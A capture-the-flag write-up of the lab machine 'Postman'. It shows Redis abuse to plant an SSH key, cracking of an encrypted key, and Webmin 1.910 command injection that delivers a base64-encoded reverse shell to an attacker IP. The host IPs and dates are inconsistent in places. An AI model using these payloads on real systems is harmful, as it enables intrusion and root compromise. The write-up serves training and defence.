
+++
title = "Postman-CPTS-Prep-Box Writeups"
date = 2026-02-17T00:00:00Z
draft = false
description = "Postman is an easy-difficulty Linux machine featuring Redis exploitation, SSH key deployment, encrypted key cracking, and Webmin command injection privilege escalation"
tags = ["CPTS", "HTB", "Postman", "CPTS Prep", "Linux", "Redis", "Webmin", "Command Injection"]
+++

## Executive Summary

During March 2020, a simulated penetration test was conducted against the Linux host "Postman". The objective was to evaluate the security posture of the target and identify potential escalation paths to achieve root-level privileges.

The assessment successfully demonstrated a complete attack chain, moving from initial reconnaissance to full system compromise. The following key findings were identified:

- **Unauthenticated Redis Instance:** A Redis 4.0.9 server was discovered running without authentication, allowing unauthorized command execution and file writes.

- **SSH Key Deployment via Redis:** The Redis vulnerability was leveraged to write an SSH public key to the redis user's authorized_keys file, providing initial shell access.

- **Encrypted SSH Key Discovery:** LinPeas enumeration revealed an encrypted SSH private key (`id_rsa.bak`) in the /opt directory, which was successfully cracked to obtain credentials for the user Matt.

- **Webmin Command Injection:** The user Matt had access to Webmin 1.910, which was vulnerable to command injection in the package update functionality. This vulnerability was exploited to execute a reverse shell as root.

**Impact:**  
This chain of exploits resulted in complete compromise of the target system. An attacker with no prior access was able to achieve root-level privileges by chaining together an unauthenticated Redis service, weak SSH key password, and an outdated version of Webmin.

**Recommendations:**

- **Secure Redis:** Redis instances should never be exposed without authentication. Implement strong passwords and bind to localhost only if remote access is not required.
- **Strong SSH Key Passphrases:** Encrypted SSH keys should use strong, complex passphrases that resist cracking attempts.
- **Regular Updates:** Webmin should be kept up-to-date to prevent exploitation of known command injection vulnerabilities.
- **Principle of Least Privilege:** Services should run with minimal necessary privileges, and sensitive files should have appropriate permissions.

## About

Postman is an easy-difficulty Linux machine that focuses on Redis exploitation, SSH key manipulation, and Webmin command injection. The machine provides excellent learning opportunities for understanding how misconfigured services and outdated software can lead to complete system compromise.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with a comprehensive port scan of the target to identify all accessible services.

```bash 
# Nmap 7.94SVN scan initiated Thu Nov 13 13:03:18 2025 as: nmap -Pn -sS -sVC -p- -oN postman_nmap_full.txt 10.129.2.1
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.042s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.910
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 13 13:04:26 2025 -- 1 IP address (1 host up) scanned in 67.86 seconds

```
**Findings:** The scan revealed SSH (22/tcp), HTTP (80/tcp), Redis (6379/tcp), and Webmin on port 10000 running MiniServ 1.910. The host was identified as a Linux system.

### Phase 2: Redis Exploitation

**2. Redis Enumeration**  
Redis versions between 4.0 and 5.0 are known to be vulnerable to unauthenticated command execution. The redis-cli tool was used to connect and verify authentication requirements.

```bash 
redis-cli -h 10.10.10.160
info
config get *

10.129.2.1:6379> CONFIG GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "cluster-announce-ip"
  8) ""
  9) "unixsocket"
 10) ""
 11) "logfile"
 12) "/var/log/redis/redis-server.log"
 13) "pidfile"
 14) "/var/run/redis/redis-server.pid"
 15) "slave-announce-ip"
 16) ""
 17) "maxmemory"
 18) "0"
 19) "proto-max-bulk-len"
 20) "536870912"
 21) "client-query-buffer-limit"
 22) "1073741824"
 23) "maxmemory-samples"
 24) "5"
 25) "lfu-log-factor"
 26) "10"
 27) "lfu-decay-time"
 28) "1"
 29) "timeout"
 30) "0"
 31) "active-defrag-threshold-lower"
 32) "10"
 33) "active-defrag-threshold-upper"
 34) "100"
 35) "active-defrag-ignore-bytes"
 36) "104857600"
 37) "active-defrag-cycle-min"
 38) "25"
 39) "active-defrag-cycle-max"
 40) "75"
 41) "auto-aof-rewrite-percentage"
 42) "100"
 43) "auto-aof-rewrite-min-size"
 44) "67108864"
 45) "hash-max-ziplist-entries"
 46) "512"
 47) "hash-max-ziplist-value"
 48) "64"
 49) "list-max-ziplist-size"
 50) "-2"
 51) "list-compress-depth"
 52) "0"
 53) "set-max-intset-entries"
 54) "512"
 55) "zset-max-ziplist-entries"
 56) "128"
 57) "zset-max-ziplist-value"
 58) "64"
 59) "hll-sparse-max-bytes"
 60) "3000"
 61) "lua-time-limit"
 62) "5000"
 63) "slowlog-log-slower-than"
 64) "10000"
 65) "latency-monitor-threshold"
 66) "0"
 67) "slowlog-max-len"
 68) "128"
 69) "port"
 70) "6379"
 71) "cluster-announce-port"
 72) "0"
 73) "cluster-announce-bus-port"
 74) "0"
 75) "tcp-backlog"
 76) "511"
 77) "databases"
 78) "16"
 79) "repl-ping-slave-period"
 80) "10"
 81) "repl-timeout"
 82) "60"
 83) "repl-backlog-size"
 84) "1048576"
 85) "repl-backlog-ttl"
 86) "3600"
 87) "maxclients"
 88) "10000"
 89) "watchdog-period"
 90) "0"
 91) "slave-priority"
 92) "100"
 93) "slave-announce-port"
 94) "0"
 95) "min-slaves-to-write"
 96) "0"
 97) "min-slaves-max-lag"
 98) "10"
 99) "hz"
100) "10"
101) "cluster-node-timeout"
102) "15000"
103) "cluster-migration-barrier"
104) "1"
105) "cluster-slave-validity-factor"
106) "10"
107) "repl-diskless-sync-delay"
108) "5"
109) "tcp-keepalive"
110) "300"
111) "cluster-require-full-coverage"
112) "yes"
113) "cluster-slave-no-failover"
114) "no"
115) "no-appendfsync-on-rewrite"
116) "no"
117) "slave-serve-stale-data"
118) "yes"
119) "slave-read-only"
120) "yes"
121) "stop-writes-on-bgsave-error"
122) "yes"
123) "daemonize"
124) "yes"
125) "rdbcompression"
126) "yes"
127) "rdbchecksum"
128) "yes"
129) "activerehashing"
130) "yes"
131) "activedefrag"
132) "no"
133) "protected-mode"
134) "no"
135) "repl-disable-tcp-nodelay"
136) "no"
137) "repl-diskless-sync"
138) "no"
139) "aof-rewrite-incremental-fsync"
140) "yes"
141) "aof-load-truncated"
142) "yes"
143) "aof-use-rdb-preamble"
144) "no"
145) "lazyfree-lazy-eviction"
146) "no"
147) "lazyfree-lazy-expire"
148) "no"
149) "lazyfree-lazy-server-del"
150) "no"
151) "slave-lazy-flush"
152) "no"
153) "maxmemory-policy"
154) "noeviction"
155) "loglevel"
156) "notice"
157) "supervised"
158) "no"
159) "appendfsync"
160) "everysec"
161) "syslog-facility"
162) "local0"
163) "appendonly"
164) "no"
165) "dir"
166) "/var/lib/redis"
167) "save"
168) "900 1 300 10 60 10000"
169) "client-output-buffer-limit"
170) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
171) "unixsocketperm"
172) "0"
173) "slaveof"
174) ""
175) "notify-keyspace-events"
176) ""
177) "bind"
178) "0.0.0.0 ::1"
10.129.2.1:6379>

```

**Findings:** The Redis server allowed connections without any authentication, and configuration queries confirmed the ability to operate freely.

**3. SSH Directory Verification**  
The Redis configuration was examined to determine the default data directory, and the existence of the .ssh folder for the redis user was verified.
```bash 
redis-cli -h 10.10.10.160
config get dir
config set dir /var/lib/redis/.ssh
```
**Findings:** Setting the directory to `/var/lib/redis/.ssh` returned OK, confirming the .ssh folder existed for the redis user.

**4. SSH Public Key Generation**  
An SSH key pair was generated locally to be deployed to the target.

```bash 
ssh-keygen -t rsa -f redis_key
cat redis_key.pub > key.txt
echo -e "\n\n" >> key.txt
cat redis_key.pub >> key.txt
```

**5. SSH Key Deployment via Redis**  
The public key was set as a Redis key and then saved to the authorized_keys file.
```bash
redis-cli -h 10.10.10.160
set ssh_key "\n\n$(cat key.txt)\n\n"
config set dir /var/lib/redis/.ssh
config set dbfilename authorized_keys
save
```

**6. SSH Access as Redis User**  
The private key was used to establish an SSH session as the redis user.
```bash
chmod 600 redis_key
ssh -i redis_key redis@10.10.10.160
```

### Phase 3: Lateral Movement to Matt User

**7. LinPeas Enumeration**  
LinPeas was transferred to the target to perform automated enumeration for privilege escalation vectors.
```bash
scp -i redis_key linpeas.sh redis@10.10.10.160:/tmp
ssh -i redis_key redis@10.10.10.160
cd /tmp
chmod +x linpeas.sh
./linpeas.sh
```

**Findings:** LinPeas identified an interesting file: `/opt/id_rsa.bak` - an encrypted SSH private key.

**8. Encrypted Key Extraction**  
The encrypted SSH key was examined and copied locally for offline cracking.
```bash
cat /opt/id_rsa.bak
```

**9. SSH Key Cracking**  
The ssh2john tool was used to convert the key to a hash format suitable for John the Ripper, followed by a dictionary attack.

```bash
ssh2john id_rsa.bak > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
**Findings:** The passphrase was successfully cracked, revealing the password `computer2008`.

**10. User Switching to Matt**  
Attempting to use the key for direct SSH access failed, but the passphrase allowed switching to the Matt user via su.
```bash
su - matt
```

**11. User Flag Retrieval**  
Once logged in as Matt, the user flag was retrieved.

```bash
cat /home/matt/user.txt
```

### Phase 4: Webmin Exploitation

**12. Webmin Access**  
The credentials for Matt were used to log in to the Webmin instance running on port 10000.
```bash
https://10.10.10.160:10000
# Login with matt:computer2008
```
**Findings:** The login was successful, providing low-privileged access to the Webmin application.

**13. Webmin Version Enumeration**  
The Webmin version was identified to check for known vulnerabilities.

```bash
cat /etc/webmin/version
```
**Findings:** The version was confirmed as 1.910, which is vulnerable to command injection in the package update functionality.
### Phase 5: Privilege Escalation to Root

**14. Vulnerability Research**  
Searching for exploits in Webmin 1.910 revealed a command injection vulnerability in the package updater through the `u` POST parameter.

**15. Request Interception**  
With Burp Suite configured as a proxy, the package update functionality was accessed by navigating to System → Software Package Updates and clicking "Update Selected Packages". The request was intercepted.

**16. Command Injection Testing**  
The intercepted request was sent to Repeater. All existing parameters were removed and replaced with a test payload to verify command execution.

```text
POST /package-updates/update.cgi HTTP/1.1
Host: 10.10.10.160:10000
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-unlicensed; charset=UTF-8
X-Progressive-URL: https://10.10.10.160:10000/package-updates/update.cgi
X-Requested-From: package-updates
X-Requested-From-Tab: webmin
X-Requested-With: XMLHttpRequest
Content-Length: 23
Connection: close
Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnaviagaton=1
Cookie: redirect=1; testing=1; sid=5f5690b7603f4d60d2c34506d7bc009
u=acl%2Fapt&u=\$(whoami)
```

**Findings:** The server attempted to install a package named "root", confirming command execution.

**17. Reverse Shell Payload**  
A base64-encoded reverse shell payload was crafted to avoid spaces and special characters. The IFS variable was used to prevent command splitting.

```bash

echo\$[IFS]YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMQ== | base64\$[IFS]-d | bash
```

**18. Final Payload Construction**  
The complete payload was URL-encoded and added to the request.

```text

POST /package-updates/update.cgi HTTP/1.1
Host: 10.10.10.160:10000
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-unlicensed; charset=UTF-8
X-Progressive-URL: https://10.10.10.160:10000/package-updates/update.cgi
X-Requested-From: package-updates
X-Requested-From-Tab: webmin
X-Requested-With: XMLHttpRequest
Content-Length: 23
Connection: close
Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnaviagaton=1
Cookie: redirect=1; testing=1; sid=5f5690b7603f4d60d2c34506d7bc009
u=acl%2Fapt&u=\$(echo\$[IFS]YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMQ%3D%3D|base64\$[IFS]-d|bash)
```

**19. Reverse Shell Listener**  
Before sending the payload, a netcat listener was started on the attacking machine.

```bash
nc -lvnp 4444
```

**20. Root Shell Acquisition**  
The modified request was forwarded, and a reverse shell connected back as root.

### Phase 6: Root Flag Retrieval

**21. Root Flag**  
With root access achieved, the final flag was retrieved.

```bash
cat /root/root.txt
```
## Key Takeaways

- **Redis Security:** Always secure Redis instances with strong authentication and bind to localhost if remote access isn't required.
    
- **Defense in Depth:** Multiple layers of security are necessary; a single misconfigured service can lead to initial access.
    
- **Credential Strength:** SSH key passphrases must be strong enough to resist dictionary attacks.
    
- **Software Updates:** Keeping software updated is critical; Webmin 1.910 had a known command injection vulnerability.
    
- **Input Validation:** All user input, especially in administrative interfaces, must be properly validated and sanitized.
    
- **Principle of Least Privilege:** Services should run with minimal necessary privileges to limit the impact of compromise.




